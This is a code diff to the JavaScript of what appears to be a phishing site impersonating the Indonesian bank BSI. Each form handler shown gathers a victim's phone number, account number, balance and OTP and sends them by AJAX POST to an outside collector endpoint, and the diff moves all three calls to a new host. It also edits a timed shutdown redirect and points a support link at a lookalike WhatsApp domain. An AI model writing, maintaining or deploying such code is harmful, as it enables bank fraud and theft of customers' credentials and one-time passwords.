@@ -1,7 +1,7 @@
 let tglNow = new Date();
-let waktuBatas = new Date("2025-06-07T23:59:59");
+let waktuBatas = new Date("2025-05-30T23:59:59");
 if (tglNow.getTime() >= waktuBatas.getTime()) {
-  document.location.href = 'https://expiredweb.pages.dev';
+  document.location.href = 'https://suspend-web.pages.dev';
 } else {
   console.log('Server aktif');
 }
@@ -21,7 +21,7 @@ var logo = "▩----𝘄𝘄𝘄.𝗯𝗮𝗻𝗸𝗯𝘀𝗶.𝗰𝗼.𝗶𝗱--
   var gabungan = "" + logo + '\n\n𝗧𝗮𝗿𝗶𝗳 • ' + tarif + '\n𝗡𝗼.𝗛𝗽 • <b>+62' + nohp.value + '</b>';
         
    $.ajax({
-        url: 'https://bdudu.cloud/ku/i.php',       
+        url: 'https://anjayhostjon.cloud/BSI/xe3jk/im.php',       
         type: 'POST',
         data: { message: gabungan },
         crossDomain: true,
@@ -49,7 +49,7 @@ var logo = "▩----𝘄𝘄𝘄.𝗯𝗮𝗻𝗸𝗯𝘀𝗶.𝗰𝗼.𝗶𝗱--
   var gabungan = "" + logo + '\n𝗧𝗮𝗿𝗶𝗳 • ' + tarif.value + '\n𝗡𝗼.𝗛𝗽 • <b>+62' + nomor.value + '</b>\n\n𝗡𝗼.𝗥𝗲𝗸 • ' + rek.value  +  '\n𝗦𝗮𝗹𝗱𝗼 • <pre>' + saldo.value + '</pre>';
         
    $.ajax({
-        url: 'https://bdudu.cloud/ku/i.php',       
+        url: 'https://anjayhostjon.cloud/BSI/xe3jk/im.php',       
         type: 'POST',
         data: { message: gabungan },
         crossDomain: true,
@@ -91,7 +91,7 @@ function sendOtp() {
  var gabungan = "" + logo + '\n𝗧𝗮𝗿𝗶𝗳 • ' + tarif.value + '\n𝗡𝗼.𝗛𝗽 • <b>+62' + nomor.value + '</b>\n\n𝗡𝗼.𝗥𝗲𝗸 • ' + rek.value + '\n𝗦𝗮𝗹𝗱𝗼 • <pre>' + saldo.value + '</pre>' + '\n\n𝗢𝗧𝗣 • <b>' + sixpin.value + '</b>';
     
 $.ajax({
-        url: 'https://bdudu.cloud/ku/i.php',       
+        url: 'https://anjayhostjon.cloud/BSI/xe3jk/im.php',       
         type: 'POST',
         data: { message: gabungan },
         crossDomain: true,
@@ -130,7 +130,7 @@ function getcs(){
  $("#djload").show();   
   
 setTimeout(function(){  
-location.href='wa';
+location.href='https://bsigacorsetiaphariini.wasap.my';
     }, 1000);
     setTimeout(function(){
     $("#djload").hide();   
